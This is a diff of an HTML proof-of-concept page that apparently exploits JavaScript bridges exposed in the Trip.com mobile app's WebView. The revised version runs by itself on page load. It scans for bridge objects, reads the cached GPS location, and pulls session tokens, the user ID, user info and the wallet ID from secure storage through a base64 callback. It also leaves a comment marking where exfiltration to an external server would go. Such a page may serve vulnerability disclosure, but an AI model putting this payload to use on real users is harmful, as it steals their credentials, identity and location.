@@ -1,112 +1,138 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trip.com Terminal PoC</title>
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Trip.com Critical Vulnerability PoC</title>
     <style>
-        /* تم ترمینال ساده: پس‌زمینه مشکی، متن سفید */
-        body { font-family: 'Consolas', monospace; background: #000; color: #fff; padding: 15px; line-height: 1.4; }
-        .card { border: 1px solid #444; padding: 10px; margin-bottom: 15px; background: #000; }
-        h3 { margin-top: 0; color: #5bc0de; border-bottom: 1px solid #444; padding-bottom: 5px; font-size: 16px; }
-        #logs { font-size: 13px; height: 300px; overflow-y: auto; border: 1px solid #222; padding: 8px; background: #000; color: #fff; }
-        .func { color: #f0ad4e; font-weight: bold; } /* رنگ توابع: نارنجی */
-        .success { color: #5cb85c; } /* رنگ موفقیت: سبز */
-        .error { color: #d9534f; } /* رنگ خطا: قرمز */
-        button { width: 100%; padding: 12px; background: #333; color: #fff; border: 1px solid #555; cursor: pointer; margin-top: 10px; font-family: monospace; }
-        ul { list-style: none; padding: 0; }
-        li { margin-bottom: 5px; color: #aaa; }
+      body {
+        font-family: "Courier New", monospace;
+        background: #1a1a1a;
+        color: #00ff00;
+        padding: 20px;
+      }
+      .card {
+        border: 1px solid #00ff00;
+        padding: 15px;
+        margin-bottom: 20px;
+        background: #000;
+        box-shadow: 0 0 10px #00ff00;
+      }
+      h3 {
+        color: #fff;
+        text-transform: uppercase;
+        border-bottom: 1px solid #00ff00;
+      }
+      .critical {
+        color: #ff0000;
+        font-weight: bold;
+        text-shadow: 0 0 5px #ff0000;
+      }
+      #logs {
+        white-space: pre-wrap;
+        word-wrap: break-word;
+      }
     </style>
-</head>
-<body>
-
+  </head>
+  <body>
     <div class="card">
-        <h3>[ BRIDGE STATUS ]</h3>
-        <ul id="bridgeStatus">Checking availability...</ul>
+      <h3>1. Status & Bridges</h3>
+      <ul id="bridges">
+        Scanning for entry points...
+      </ul>
     </div>
 
     <div class="card">
-        <h3>[ OUTPUT CONSOLE ]</h3>
-        <div id="logs">Ready for deployment.</div>
+      <h3>2. Live Data Extraction</h3>
+      <div id="logs">> System Initialized...</div>
     </div>
-
-    <button onclick="runExploit()">Execute Payload</button>
 
     <script>
-        function log(msg, type = 'info') {
-            const box = document.getElementById('logs');
-            let color = "#fff"; // سفید برای توضیحات عادی
-            if (type === 'func') color = "#f0ad4e"; // نارنجی برای توابع
-            if (type === 'success') color = "#5cb85c"; // سبز برای دیتا
-            if (type === 'error') color = "#d9534f"; // قرمز برای خطا
-            
-            box.innerHTML += `\n<br><span style="color:${color}">> ${msg}</span>`;
-            box.scrollTop = box.scrollHeight;
+      function log(msg, isCritical = false) {
+        var box = document.getElementById("logs");
+        var prefix = isCritical ? "[CRITICAL] " : "[INFO] ";
+        var color = isCritical ? "red" : "#00ff00";
+        box.innerHTML += `\n> <span style="color:${color}">${prefix}${msg}</span>`;
+        console.log(prefix + msg);
+      }
+
+      // --- CRITICAL: Listen for callback wrapped in Base64 (ax0.b / ax0.c) ---
+      window.__bridge_callback = function (base64Data) {
+        try {
+          // Decrypt Base64 (as seen in ax0.b.b)
+          var decodedData = atob(base64Data);
+          var json = JSON.parse(decodedData);
+
+          log("BRIDGE CALLBACK INTERCEPTED!", true);
+          log("Payload: " + decodedData);
+
+          // Extract value from standard response format
+          var secret = json.value || (json.param && json.param.value);
+          if (secret) {
+            log("SUCCESS: Extracted Secret: " + JSON.stringify(secret), true);
+            // In a real attack, exfiltrate to external server here
+          }
+        } catch (e) {
+          log("Callback Error: " + e.message, true);
+        }
+      };
+
+      function startHeist() {
+        log("Executing Stealth Extraction...");
+
+        // 1. Precise Location Extraction (Locate_a.getCachedLocationData)
+        if (window.Locate_a && window.Locate_a.getCachedLocationData) {
+          log("Querying Cached Location...");
+          var loc = window.Locate_a.getCachedLocationData();
+          if (loc) {
+            log("LOCATION LEAKED: " + JSON.stringify(loc), true);
+          }
         }
 
-        // شنود بازگشت دیتا طبق کلاس ax0.b
-        window.__bridge_callback = function(base64Data) {
-            try {
-                const decoded = atob(base64Data);
-                log("DATABASE RESPONSE RECEIVED", "success");
-                log(`DATA: ${decoded}`, "success");
-                // اگر دیتا شامل توکن بود، آلرت بده
-                if(decoded.includes("token")) alert("CRITICAL DATA STOLEN: " + decoded);
-            } catch(e) { log("Callback Error: " + e.message, "error"); }
-        };
+        // 2. Sensitive Storage Extraction (IBUStorageV2_a.IBUGetUserValue)
+        if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
+          log("Probing Secure Storage (nh.a)...");
 
-        async function runExploit() {
-            log("Starting extraction sequence...", "info");
+          // Targets identified from source code analysis
+          var targets = [
+            { bus: "common", key: "token" },
+            { bus: "common", key: "uid" },
+            { bus: "common", key: "vtoken" },
+            { bus: "user", key: "userInfo" },
+            { bus: "wallet", key: "walletId" }
+          ];
 
-            // ۱. ابتدا استخراج دیتابیس (امن‌تر و سریع‌تر)
-            if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
-                log("Calling <span class='func'>IBUStorageV2_a.IBUGetUserValue()</span>", "func");
-                const payload = JSON.stringify({
-                    "action": "IBUGetUserValue",
-                    "arguments": { "bussiness": "common", "key": "token" },
-                    "callback": "__bridge_callback"
-                });
-                window.IBUStorageV2_a.IBUGetUserValue(payload);
-                log("Storage request sent. Waiting...");
-            }
+          targets.forEach(function(target, index) {
+            setTimeout(function() {
+              log("Requesting [" + target.key + "] from [" + target.bus + "]...");
+              
+              // Payloads must be a JSON string that H5URLCommand can parse
+              var payload = JSON.stringify({
+                callback_tagname: "leak_" + target.key, // Required for tracking
+                bussiness: target.bus, // Note: double 's' required by Java source
+                key: target.key
+              });
 
-            // وقفه برای جلوگیری از هنگ کردن (۱ ثانیه)
-            await new Promise(r => setTimeout(r, 1000));
-
-            // ۲. تست Storage عمومی (اگر پل اول جواب نداد)
-            if (window.Storage_a && window.Storage_a.get) {
-                log("Calling <span class='func'>Storage_a.get()</span>", "func");
-                try {
-                    const val = window.Storage_a.get("common", "token", "null");
-                    if (val !== "null") log(`Found in Storage_a: ${val}`, "success");
-                } catch(e) { log("Storage_a fail", "error"); }
-            }
-
-            await new Promise(r => setTimeout(r, 1000));
-
-            // ۳. لوکیشن (آخرین مرحله چون سنگین است و ممکن است باعث هنگ شود)
-            if (window.Locate_a && window.Locate_a.getCachedLocationData) {
-                log("Calling <span class='func'>Locate_a.getCachedLocationData()</span>", "func");
-                try {
-                    const loc = window.Locate_a.getCachedLocationData();
-                    if (loc) {
-                        log("GPS DATA LEAKED", "success");
-                        log(`Coordinates: ${loc.lat}, ${loc.lng}`, "success");
-                    }
-                } catch(e) { log("Location call timed out or failed", "error"); }
-            }
+              window.IBUStorageV2_a.IBUGetUserValue(payload);
+            }, index * 500); // Staggering to avoid congestion
+          });
         }
+      }
 
-        // بررسی پل‌ها در لود اولیه
-        setTimeout(() => {
-            const targets = ["IBUStorageV2_a", "Storage_a", "Locate_a", "Photo_a"];
-            const statusBox = document.getElementById('bridgeStatus');
-            statusBox.innerHTML = "";
-            targets.forEach(t => {
-                const found = typeof window[t] !== 'undefined';
-                statusBox.innerHTML += `<li>- ${t}: <b style="color:${found ? '#5cb85c' : '#d9534f'}">${found ? 'ONLINE' : 'OFFLINE'}</b></li>`;
-            });
-            log("System Check Complete.");
-        }, 800);
+      // Scanner for bridge objects
+      setTimeout(function () {
+        var found = [];
+        var suspicious = ["IBUStorageV2_a", "Locate_a", "Storage", "IBUStorageV2_b", "Wallet_a"];
+        
+        suspicious.forEach(function(name) {
+          if (window[name]) found.push(name);
+        });
+
+        document.getElementById("bridges").innerHTML = found.length > 0 
+          ? found.map((b) => `<li>[+] Found Bridge: ${b}</li>`).join("")
+          : "<li>[-] No target bridges detected.</li>";
+
+        startHeist();
+      }, 1000);
     </script>
-</body>
+  </body>
 </html>
